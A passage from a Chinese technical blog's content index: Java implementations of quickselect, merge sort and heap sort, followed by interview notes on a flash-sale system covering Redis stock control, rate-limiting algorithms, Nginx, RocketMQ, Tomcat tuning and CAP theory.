class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">GetLeastNumbers_Solution</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; ret = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (k &gt; nums.length || k &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    findKthSmallest(nums, k - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* findKthSmallest 会改变数组，使得前 k 个数都是最小的 k 个数 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">        ret.add(nums[i]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">findKthSmallest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, h = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; h) &#123;</span><br><span class="line">        <span class="keyword">int</span> j = AdjustArray(nums, l, h);      </span><br><span class="line">        <span class="keyword">if</span> (j == k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (j &gt; k)</span><br><span class="line">            h = j - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">AdjustArray</span><span class="params">(<span class="keyword">int</span> s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> <span class="comment">//返回调整后基准数的位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=l,j=r,x=s[l];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;s[j]&gt;=x)j--;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) s[i]=s[j];</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;s[i]&lt;x)i++;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) s[j]=s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    s[i]=x;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="归并排序-">归并排序 -</span></h1><p> 归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。</p><p>首先考虑下如何将将二个有序数列合并。这个非常简单，只要从比较二个数列的第一个数，谁小就先取谁，取了后就在对应数列中删除这个数。然后再进行比较，如果有数列为空，那直接将另一个数列的数据依次取出即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergearray</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> first, <span class="keyword">int</span> mid, <span class="keyword">int</span> last, <span class="keyword">int</span> temp[])</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i = first, j = mid + <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">int</span> m = mid,   n = last;</span><br><span class="line">     <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> (i &lt;= m &amp;&amp; j &lt;= n)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span> (a[i] &lt;= a[j])</span><br><span class="line">             temp[k++] = a[i++];</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">             temp[k++] = a[j++];</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> (i &lt;= m)</span><br><span class="line">         temp[k++] = a[i++];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> (j &lt;= n)</span><br><span class="line">         temp[k++] = a[j++];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">         a[first + i] = temp[i];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergesort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> first, <span class="keyword">int</span> last, <span class="keyword">int</span> temp[])</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (first &lt; last)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">int</span> mid = (first + last) / <span class="number">2</span>;</span><br><span class="line">         mergesort(a, first, mid, temp);    <span class="comment">//左边有序</span></span><br><span class="line">         mergesort(a, mid + <span class="number">1</span>, last, temp); <span class="comment">//右边有序</span></span><br><span class="line">         mergearray(a, first, mid, last, temp); <span class="comment">//再将二个有序数列合并</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MergeSort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> []p = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">     mergesort(a, <span class="number">0</span>, n - <span class="number">1</span>, p);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1><span id="堆排序-">堆排序 -</span></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Heap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = arr.length;</span><br><span class="line">        <span class="comment">//构建堆</span></span><br><span class="line">        buildHeap(arr,length);</span><br><span class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> i = length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i-- ) &#123;</span><br><span class="line">            <span class="comment">//将堆顶元素与末位元素调换</span></span><br><span class="line">            <span class="keyword">int</span> temp = arr[<span class="number">0</span>];</span><br><span class="line">            arr[<span class="number">0</span>] = arr[i];</span><br><span class="line">            arr[i] = temp;</span><br><span class="line">            <span class="comment">//数组长度-1 隐藏堆尾元素</span></span><br><span class="line">            length--;</span><br><span class="line">            <span class="comment">//将堆顶元素下沉 目的是将最大的元素浮到堆顶来</span></span><br><span class="line">            sink(arr,<span class="number">0</span>,length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">buildHeap</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = length / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            sink(arr,i,length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 下沉调整</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr 数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> index 调整位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> length 数组范围</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sink</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> index,<span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> leftChild = <span class="number">2</span> * index + <span class="number">1</span>;<span class="comment">//左子节点下标</span></span><br><span class="line">        <span class="keyword">int</span> rightChild = <span class="number">2</span> * index + <span class="number">2</span>;<span class="comment">//右子节点下标</span></span><br><span class="line">        <span class="keyword">int</span> present = index;<span class="comment">//要调整的节点下标</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//下沉左边</span></span><br><span class="line">        <span class="keyword">if</span> (leftChild &lt; length &amp;&amp; arr[leftChild] &gt; arr[present]) &#123;</span><br><span class="line">            present = leftChild;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//下沉右边</span></span><br><span class="line">        <span class="keyword">if</span> (rightChild &lt; length &amp;&amp; arr[rightChild] &gt; arr[present]) &#123;</span><br><span class="line">            present = rightChild;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果下标不相等 证明调换过了</span></span><br><span class="line">        <span class="keyword">if</span> (present != index) &#123;</span><br><span class="line">            <span class="comment">//交换值</span></span><br><span class="line">            <span class="keyword">int</span> temp = arr[index];</span><br><span class="line">            arr[index] = arr[present];</span><br><span class="line">            arr[present] = temp;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//继续下沉</span></span><br><span class="line">            sink(arr,present,length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       Heap.sort(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="总结">总结</span></h1><p><img src="image-20200411191839807.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>秒杀项目</title>
      <link href="/2020/04/09/projectQA/"/>
      <url>/2020/04/09/projectQA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>整理自己秒杀项目的问答点。</p><a id="more"></a><!-- toc --><ul><li><a href="#设计原则">设计原则</a></li><li><a href="#数据库设计">数据库设计</a></li><li><a href="#页面静态化">页面静态化</a></li><li><a href="#服务降级">服务降级</a></li><li><a href="#接口防刷">接口防刷</a><ul><li><a href="#nginx">Nginx</a></li><li><a href="#隐藏接口">隐藏接口</a></li><li><a href="#单用户限制频率">单用户限制频率</a></li><li><a href="#采用验证码">采用验证码</a></li></ul></li><li><a href="#怎么解决超卖">怎么解决超卖</a></li><li><a href="#分布式session">分布式Session</a></li><li><a href="#限流算法">限流算法</a><ul><li><a href="#计数器算法">计数器算法</a></li><li><a href="#滑动窗口算法">滑动窗口算法</a></li><li><a href="#漏桶算法">漏桶算法</a></li><li><a href="#令牌桶算法">令牌桶算法</a></li></ul></li><li><a href="#nginx-1">Nginx</a><ul><li><a href="#命令">命令</a></li><li><a href="#nginx负载均衡算法">Nginx负载均衡算法</a></li><li><a href="#nginx高性能的原因">Nginx高性能的原因</a><ul><li><a href="#协程机制">协程机制</a></li></ul></li></ul></li><li><a href="#redis">Redis</a><ul><li><a href="#怎么保证redis缓存和数据库的一致性">怎么保证Redis缓存和数据库的一致性？</a></li><li><a href="#雪崩">雪崩</a></li><li><a href="#更新库存问题">更新库存问题</a></li></ul></li><li><a href="#mq">MQ</a></li><li><a href="#tomcat">Tomcat</a></li><li><a href="#cap">CAP</a><ul><li><a href="#一致性">一致性</a></li><li><a href="#可用性">可用性</a></li><li><a href="#分区容忍性">分区容忍性</a></li><li><a href="#权衡">权衡</a></li></ul></li><li><a href="#base">BASE</a><ul><li><a href="#基本可用">基本可用</a></li><li><a href="#软状态">软状态</a></li><li><a href="#最终一致性">最终一致性</a></li></ul></li></ul><!-- tocstop --><h1><span id="设计原则">设计原则</span></h1><p>单一责任制，秒杀模块不依赖其他模块，即使挂了正常下单也能走。</p><p>秒杀场景是一种读多写少的场景。</p><ol><li><p>尽量将请求拦截在上游，在秒杀前将下单按钮置灰，秒杀开始后只能下单一次。</p></li><li><p>尽量使用缓存来缓解数据库的压力。</p></li><li><p>使用消息队列去做削峰填谷，同时异步去写数据库，降低数据库的压力。</p></li></ol><h1><span id="数据库设计">数据库设计</span></h1><p><img src="image-20200409183104311.png" alt></p><p>item 商品信息表</p><p><img src="image-20200409183733005.png" alt></p><p>item_stock 库存表</p><p><img src="image-20200409183704658.png" alt></p><p>order_info 下单信息表</p><p><img src="image-20200409183638605.png" alt></p><blockquote><p>订单号有16位</p><p>前8位为时间信息，年月日</p><p>中间6位为自增序列</p><p>最后两位分库分表</p></blockquote><p>promo 秒杀商品信息表</p><p><img src="image-20200409183609319.png" alt></p><p>sequence_info </p><p>order_info表根据里面的step去存</p><p><img src="image-20200409183549383.png" alt></p><p>stock_log</p><p><img src="image-20200409183500903.png" alt></p><p>user_info 用户信息表</p><p><img src="image-20200409183418037.png" alt></p><p>user_password 用户密码表</p><p><img src="image-20200409183222767.png" alt></p><h1><span id="页面静态化">页面静态化</span></h1><p>cdn的核心原理并将静态页面部署到cdn上，之后使用了phantomjs的无头浏览器方案实现了将静态请求和动态请求合并一同部署到cdn上，更进一步的将商品详情页的流量能力提升到极致；</p><p>页面静态化，其实就是将动态生成的jsp页面，变成静态的HTML页面，让用户直接访问。这样的好处就是：</p><ul><li><p>大大提升访问速度，不需要去访问数据库，或者缓存来获取哪些数据，浏览器直接加载渲染html页即可；</p></li><li><p>搜索引擎更喜欢静的，更便于抓取，搜索引擎SEO排名更容易提高；</p></li><li><p>从安全角度讲，静态网页不宜遭到黑客攻击，如果黑客不知道你网站的后台、网站采用程序、数据库的地址，静态网页， 更不容易受到黑客的攻击；</p></li><li><p>从网站稳定性来讲，如果程序、数据库出了问题，会直接影响网站的访问，而静态网页就避免了如此情况，不会因为程序等，而损失网站数据，影响正常打开，损失用户体验，影响网站信任度；</p></li></ul><h1><span id="服务降级">服务降级</span></h1><p>服务降级是当服务器压力剧增的情况下，根据当前业务情况及流量对一些服务和页面有策略的降级，以此释放服务器资源以保证核心任务的正常运行。降级往往会指定不同的级别，面临不同的异常等级执行不同的处理。根据服务方式：可以拒接服务，可以延迟服务，也有时候可以随机服务。根据服务范围：可以砍掉某个功能，也可以砍掉某些模块。总之服务降级需要根据不同的业务需求采用不同的降级策略。主要的目的就是服务虽然有损但是总比没有好。</p><p><strong>实际：</strong></p><p>不实时显示库存。</p><p>例如用户抢购需要填写二维码。</p><p>不能及时反馈抢购成功消息，显示排队中。</p><h1><span id="接口防刷">接口防刷</span></h1><h2><span id="nginx">Nginx</span></h2><p>校验恶意请求</p><p>Nginx黑名单：过滤日志访问API接口的IP，统计每10分钟调用超过100次的IP，直接丢进nginx的访问黑名单</p><p>在 Nginx 上限制单 IP 单位时间的请求数，以及单 IP 的并发连接数。</p><h2><span id="隐藏接口">隐藏接口</span></h2><p>每次点击秒杀按钮，先从服务器获取一个秒杀验证值（接口内判断是否到秒杀时间），使用md5加密userID和秒杀ID然后再加盐。</p><p>Redis以缓存用户ID和商品ID为Key，秒杀地址为Value缓存验证值，过期时间设置1分钟左右的随机值。</p><p>用户请求秒杀商品的时候，要带上秒杀验证值进行校验。</p><h2><span id="单用户限制频率">单用户限制频率</span></h2><p>每当用户访问一次下单接口就将用户的访问数+1，到达一定阈值就拒绝访问。</p><h2><span id="采用验证码">采用验证码</span></h2><p>加入验证码来防止机器刷接口。</p><h1><span id="怎么解决超卖">怎么解决超卖</span></h1><blockquote><p>使用redis服务器，将并发的请求转化成串行的请求，逐一处理每一个请求，原子操作减库存。<br>减库存sql，set库存=库存-1 where 库存&gt;0。</p></blockquote><ol><li>在系统初始化时，或者定时任务，调用接口时将商品的库存数量加载到Redis缓存中</li><li>在Redis中设置一个key表示是否该秒杀商品有库存</li><li>接收到秒杀请求时，先判断key是否为空，如果为空在Redis中进行预减库存，当Redis中的库存不足时，直接返回秒杀失败，并将key设置为true；</li><li>将请求放入异步队列中，返回正在排队中；</li><li>服务端异步队列将请求出队，出队成功的请求可以生成秒杀订单，减少数据库库存，返回秒杀订单详情。</li></ol><p>异步队列开启事务，如果失败在catch中将库存加回去，同时去掉标志位。</p><p>如果Redis超卖了就使用lua脚本</p><p>可以使用JVM缓存去做flag，但是需要用zookeeper。</p><h1><span id="分布式session">分布式Session</span></h1><p>对每个登录的用户分发Token，将Token放入Redis中，确保分布式的访问。</p><h1><span id="限流算法">限流算法</span></h1><p>主要使用Guava的RateLimiter进行限流，采用的是令牌桶机制。</p><p>为什么用令牌桶：</p><blockquote><p>漏桶算法能够强行限制数据的传输速率，而令牌桶算法在能够限制数据的平均传输速率外，<strong>还允许某种程度的突发传输</strong>。在令牌桶算法中，只要令牌桶中存在令牌，那么就允许突发地传输数据直到达到用户配置的门限，<strong>因此它适合于具有突发特性的流量</strong>。</p></blockquote><h2><span id="计数器算法">计数器算法</span></h2><p>通过一个计数器 counter 来统计一段时间内请求的数量，并且在指定的时间之后重置计数器。</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/other20190427163256.png" alt="img"></p><p>该方法实现简单，但是有临界问题。例如，允许一分钟内通过的请求数为 N，如果在重置计数器的前后一小段时间内分别请求 N 次，那么在这一小段时间内总共请求了 2N 次，超出了规定的 N 次。</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/other20190427163331.png" alt="img"></p><h2><span id="滑动窗口算法">滑动窗口算法</span></h2><p>是计数器算法的一种改进，将原来的一个时间窗口划分成多个时间窗口，并且不断向右滑动该窗口。</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/other20190427163435.png" alt="img"></p><p>在临界位置的突发请求都会被算到时间窗口内，因此可以解决计数器算法的临界问题。</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/other20190427163502.png" alt="img"></p><h2><span id="漏桶算法">漏桶算法</span></h2><p>能够以恒定速率处理请求。</p><p>请求需要先放入缓存中，当缓存满了时，请求会被丢弃。</p><p><img src="https://images.xiaozhuanlan.com/photo/2019/45fd0c7d1684df040295f21ee5a1b13c.png" alt="img"></p><h2><span id="令牌桶算法">令牌桶算法</span></h2><p>和漏桶算法的区别在于它是以恒定速率添加令牌，当一个请求到来时，先从令牌桶取出一个令牌，如果能取到令牌那么就可以处理该请求。</p><p>令牌桶的大小有限，超过一定的令牌之后再添加进来的令牌会被丢弃。</p><p>令牌桶算法允许突发请求，因为令牌桶存放了很多令牌，那么大量的突发请求会被执行。但是它不会出现临界问题，在令牌用完之后，令牌是以一个恒定的速率添加到令牌桶中的，因此不能再次发送大量突发请求。</p><p><img src="https://images.xiaozhuanlan.com/photo/2019/45334f956d2902b43581bc32846a02ae.png" alt="img"></p><h1><span id="nginx">Nginx</span></h1><p>将静态网页部署在Nginx上，在静态网页方面，Nginx是比Tomcat快的。</p><p>使用反向代理动态请求到Tomcat上，<strong>Nginx可以管理后端的一个tomcat集群，然后以一个统一的域名供用户去访问</strong>；</p><p><strong>nginx动静分离服务器</strong></p><ul><li>location节点path特定resources:静态资源路径；</li><li>location节点其它路径：动态资源用；</li></ul><p><strong>如何使用动态资源？</strong><br>nginx做反向代理服务器</p><ul><li>设置upstream server</li><li>设置动态请求location为proxy pass路径；</li><li>开启tomcat access log(访问日志)验证</li></ul><h2><span id="命令">命令</span></h2><ul><li>sbin/nginx -c conf/nginx.conf启动;</li><li>修改配置后直接sbin/nginx -s reload无缝重启;</li></ul><h2><span id="nginx负载均衡算法">Nginx负载均衡算法</span></h2><p><strong>1. 轮询(默认)</strong><br>每个web请求按照时间顺序逐一分配到不同的后端服务器，如果后端服务器over了，就自动剔除；</p><p><strong>2. weight权重</strong><br>指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况，weight默认是1；</p><p><strong>3. 最少链接</strong><br>web请求会被转发到连接数最少的服务器上；</p><p><strong>4. ip_hash</strong><br>每个请求按访问ip的hash值分配，这样同一客户端连续的Web请求都会被分发到同一服务器进行处理，可以解决session的问题。当后台服务器宕机时，会自动跳转到其它服务器；</p><p><strong>5. url_hash（第三方）</strong><br>nginx按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存服务器、文件服务器、静态服务器时比较有效。缺点是当后端服务器宕机的时候，url_hash不会自动跳转的其他缓存服务器，而是返回给用户一个503错误；</p><p><strong>6. fair（第三方）</strong><br>按后端服务器的响应时间来分配请求，响应时间短的优先分配；</p><h2><span id="nginx高性能的原因">Nginx高性能的原因</span></h2><p><img src="https://img-blog.csdnimg.cn/20190824110215219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dodzE1MjIxODM2MzQy,size_16,color_FFFFFF,t_70" alt="Nginx多进程模型"></p><p>Nginx高性能主要分为以下三点：</p><ul><li><strong>epoll多路复用完成非阻塞式的IO操作</strong>；</li><li><strong>master worker进程模型，允许其进行平滑重启和配置，不会断开和客户端连接</strong>；</li><li><strong>协程机制，完成单进程单线程模型，并支持并发编程调用接口</strong>；</li></ul><p>管理员理解为root操作用户，用于启动管理nginx进程；<br>Master进程的主要功能：</p><ul><li><p>接收来自外界的信号；</p></li><li><p>向各个worker进程发送信号；</p></li><li><p>监控worker进程的运行状态；</p></li><li><p>当worker进程在异常情况下退出后，会自动重启新的worker进程；</p></li></ul><p>nginx会启动一个master进程，然后根据配置文件内的worker进程的数量去启动相应的数量的worker进程，master进程和worker进程是一个父子关系；master进程用来管理worker进程，worker进程才是用来管理客户端连接的。</p><p>Master进程会先创建好对应的socke去监听对应的端口，然后再fork出多个worker进程，master会启动一个epoll的多路复用模型；当client想要在socket端口建立经典的TCP三次握手建立连接的时候，对应的epoll多路复用会产生一个回调，通知所有的可以accept的worker进程，但只有一个worker进程会成功，其它的都会失败。</p><p>Nginx提供了一把共享锁accept_mutex来保证同一时刻只有一个work进程在accept连接，从而解决集群问题；当一个worker进程accept这个连接后，就开始读取请求，解析请求，处理请求，产生数据后，再返回给客户端，最后才断开连接；</p><h3><span id="协程机制">协程机制</span></h3><p>一个线程可以有多个协程，协程是线程的内存模型</p><ul><li><p>依附于线程的内存模型，切换开销小；</p></li><li><p>遇阻塞及归还执行权，代码同步，调用新的不阻塞的协程；</p></li><li><p>无需加锁；</p></li></ul><h1><span id="redis">Redis</span></h1><h2><span id="怎么保证redis缓存和数据库的一致性">怎么保证Redis缓存和数据库的一致性？</span></h2><p>在其他一般读大于写的场景，一般处理的<strong>原则</strong>是：<strong>缓存只做失效，不做更新。</strong></p><p><strong>失效</strong>：应用程序先从cache取数据，没有得到，则从数据库中取数据，成功后，放到缓存中。</p><p><strong>更新</strong>：先把数据存到数据库中，成功后，再让缓存失效。</p><h2><span id="雪崩">雪崩</span></h2><h2><span id="更新库存问题">更新库存问题</span></h2><h1><span id="mq">MQ</span></h1><p><strong>Producer解决消息生产的问题,Consumer消息的消费端</strong><br><strong>Broker</strong><br>相当于一个中间人，<strong>由topic和MessageQueue组成</strong>，任何一条rocketmq的消息都是隶属于某一个topic,一个topic可以被一个messagebroker管理，也可以被多个messagebroker管理；</p><p>Broker向Nameserver发送注册请求，broker的ip和负责的topic,queue；<br>每一个broker至少有一个queue,producer从Nameserver上发现broker1；</p><p>采用负载轮询的方式第一次请求到queue1中，生成一个message1,第二次请求到queue2,生成一个message2,同时consumer会向这两个queue分别建立长连接。<br>当producer做对应投递时，consumer会被唤醒，拉取对应的message,这种方式被称为长轮询；<br><strong>Consumer group的作用</strong>：以queue为单位作为一个消息的管理，当consumer消费完一个message的时候会回复一个消息给对应的queue,并且将对应的message2变为已经消费成功要被干掉的状态；</p><p>若对应的<strong>一个queue被多个consumer消费</strong>的情况下，势必会造成一个同步的问题，存在一个<strong>锁竞争</strong>的机制，rocketmq采用的是以queue为单位平均的分配给consumer,所以设计一个好的中间件就是为了保证<strong>queue和consumer</strong>的数量相等；</p><p>当有多个consumer group,<strong>一个订单系统</strong>就属于一个group,另外一个consumer group就属于<strong>商品系统</strong>；生产者端并不知道生成的消息对应的消费端是哪个系统，只会无脑的投消息，关注这个消息的人指出来即可。<strong>topicA</strong>还是以consumer_group为管理的基础单元，一个queue1可以被一个consumer group中的一个consumer所消费，也可以被另一个consumer group中的consumer所消费，<strong>以consumer_group去做对应消息的消费和管理</strong>。</p><p>如果对应的broker1产生了任何异常，producer知道broker掉线了，没办法投递对应的消息；</p><p>broker2作为broker1的slave,平时不对外进行服务，只做消息的从库，一旦对应的message1被消费；一旦broker1发生异常，nameserver感知到会将broker2变为主库，并且通知producer和consumer端，让其通过broker2去接管对应的消费，slave和master之间的数据可以是同步，也可以是异步。</p><p>同步的话，producer生成在broker1中生产message1成功，也要broker2中备份message1也能够成功，性能偏低；</p><p>主broker1作为生产成功\消费成功即可,roker2做异步复制即可。只要网络的延迟小，对应的cpu处理速度快，是不会发生消息丢失的情况。但是在分布式的环境下，没有办法同时保证强一致性和可用性。如果选择强可用性肯定会降低强一致性，当发生主备切换的时候可能会发生消息的丢失。</p><ul><li><strong>消息队列事务型消息基于 “二阶段” 消息实现；</strong></li><li><strong>事务型消息是否投递与消息发布者本地事务状态保持一致；</strong></li><li><strong>事务型消息状态回查是保证了 “事务型消息” 的严谨性。</strong></li><li>什么叫事务性呢？就是保证数据库的事务提交，只要事务提交了就一定会保证消息发送成功。数据库内事务回滚了，消息必定不发送，事务提交未知，消息也处于一个等待的状态；</li></ul><h1><span id="tomcat">Tomcat</span></h1><p>server.tomcat.accept-count:等待队列长度。默认100；<br>server.tomcat.max-connections:最大可被连接数，默认10000<br>server.tomcat.max-threads:最大工作线程数，默认200<br>server.tomcat.min-spare-threads:最小线程数，默认10<br>默认配置下，连接超过10000后出现拒绝连接情况；<br>默认配置下，触发的请求超过200+100后拒绝处理；<br>定制化内嵌Tomcat开发</p><p>keepAliveTimeOut:多少毫秒后不响应的断开keepalive(设置在服务端上)<br>maxKeepAliveRequests:多少次请求后keepalive断开失效<br>使用WebServerFactoryCustomizer<configurableservletwebserverfactory>定制化内嵌tomcat配置</configurableservletwebserverfactory></p><h1><span id="cap">CAP</span></h1><p>分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition 